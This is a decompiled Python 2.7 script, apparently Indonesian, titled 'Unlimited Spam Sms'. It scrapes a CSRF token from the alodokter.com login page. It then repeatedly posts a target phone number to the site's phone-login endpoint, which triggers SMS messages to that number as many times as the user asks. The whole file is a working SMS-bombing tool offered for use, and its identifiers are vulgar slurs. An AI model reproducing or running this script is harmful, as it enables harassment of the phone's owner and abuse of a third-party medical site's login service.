# Filenames : <Sazxt>
# python bytecode : 2.7
# Time Succses Parser : Mon Jul  6 12:54:48 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

hii = '\x1b[4;32m'
b = '\x1b[34;1m'
pu = '\x1b[37;1m'
k = '\x1b[33;1m'
m = '\x1b[31;1m'
h = '\x1b[32;1m'
u = '\x1b[35;1m'
bi = '\x1b[36;1m'
hi = '\x1b[30;1m'
p = '\x1b[0m'
j = '\x1b[1;38;5;208m'
import requests, os, sys, time
from bs4 import BeautifulSoup as BS
os.system('clear')
os.system('xdg-open https://youtube.com/SanzSoekamti')

def meki():
    ngeue = [
     '', '.', '..', '...']
    for x in ngeue:
        print '\r\x1b[1;92m[' + pu + '+' + h + '] \x1b[1;93mProses\x1b[0m' + x,
        sys.stdout.flush()
        time.sleep(1)


class memek:

    def __init__(self):
        self.ses = requests.Session()

    def kontol(self, no):
        self.ses.headers.update({'referer': 'https://www.alodokter.com/login-alodokter'})
        req1 = self.ses.get('https://www.alodokter.com/login-alodokter')
        bs1 = BS(req1.text, 'html.parser')
        token = bs1.find('meta', {'name': 'csrf-token'})['content']
        head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36', 
           'content-type': 'application/json', 
           'referer': 'https://www.alodokter.com/login-alodokter', 
           'accept': 'application/json', 
           'origin': 'https://www.alodokter.com', 
           'x-csrf-token': token}
        req2 = self.ses.post('https://www.alodokter.com/login-with-phone-number', headers=head, json={'user': {'phone': no}})
        if req2.json()['status'] == 'success':
            print h + '[' + pu + '\xe2\x9c\x93' + h + '] ' + pu + 'Spam Sms ' + k + no + m + ' [' + h + ' Succes ' + m + ']'
        else:
            print m + '[' + pu + 'x' + m + '] ' + pu + 'Spam Sms ' + k + no + m + ' [' + u + ' Gagal ' + m + ']'


while True:
    try:
        time.sleep(10)
        os.system('clear')
        print j + '  /\\    ' + bi + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97        ' + u + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3 \xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97 \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3'
        print j + ' /  \\   ' + bi + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\xbd \xe2\x95\x91  ' + j + '\xc2\xab--\xc2\xbb  ' + u + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97 \xe2\x95\x91 \xe2\x95\xbd \xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        print j + ' |' + u + '**' + j + '|  ' + bi + '\xe2\x95\xbc\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xbf  \xe2\x95\xbc\xe2\x95\x9d  \xe2\x95\xbf\xe2\x95\xa9   \xe2\x95\x9a\xe2\x95\xbe      ' + u + '\xe2\x95\xbc\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xbc\xe2\x95\xa9   \xe2\x95\xa9\xe2\x95\xbc\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        print j + ' |' + p + '--' + j + '|  ' + m + '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        print j + '/[==]\\ ' + m + '\xe2\x95\x91 ' + h + 'Author' + m + ': ' + pu + 'Sanz ' + hi + 'X ' + h + 'Youtube' + m + ': ' + pu + 'SANZ SOEKAMTI ' + m + '\xe2\x95\x91'
        print j + '|/' + bi + '\xe2\x80\xa2\xe2\x80\xa2' + j + '\\| ' + m + '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        print pu + '              <' + m + '/' + pu + '> ' + hi + 'Unlimited Spam Sms ' + pu + '<' + m + '/' + pu + '>\n'
        no = raw_input(h + '[' + pu + '\xc3\x97' + h + '] ' + k + 'Contoh ' + m + ': ' + p + '085xxxxxxxxx\n' + h + '[' + pu + '+' + h + '] ' + k + 'Target ' + m + ': ' + p)
        jml = int(input(h + '[' + pu + '+' + h + '] ' + k + 'Jumlah Spam Sms ' + m + ': ' + p))
        print pu + '-----------------------------'
        meki()
        print pu + '\n-----------------------------'
        main = memek()
        for i in range(jml):
            main.kontol(no)

        exit()
    except Exception:
        sys.exit()
    except KeyboardInterrupt:
        print m + '[' + pu + '!' + m + '] ' + p + 'Ctrl + C Detected'
        sys.exit()
